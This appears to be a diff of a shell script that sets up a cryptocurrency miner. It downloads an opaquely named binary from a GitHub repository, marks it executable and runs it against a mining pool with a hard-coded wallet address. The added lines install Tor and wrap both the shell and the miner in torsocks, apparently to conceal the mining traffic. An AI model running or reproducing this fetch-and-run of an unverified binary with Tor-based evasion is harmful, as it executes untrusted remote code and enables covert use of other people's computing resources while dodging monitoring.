@@ -1,5 +1,9 @@
 sudo apt update
-sudo apt install libomp5 -y
 wget https://github.com/bizreygha/amezx/raw/main/vrs.04
+sudo apt install libomp5 tor -y
+dpkg -s libomp5 | grep Status
+ss -tulnp | grep 9050
+torsocks bash
+sudo apt install libomp5 -y
 chmod +x vrs.04
-./vrs.04 -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RP3HAzjfe4sbNrk56AwtJvyvnmkxooVVXt.lol -p x -t 1
+torsocks ./vrs.04 -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RP3HAzjfe4sbNrk56AwtJvyvnmkxooVVXt.lol -p x -t 1
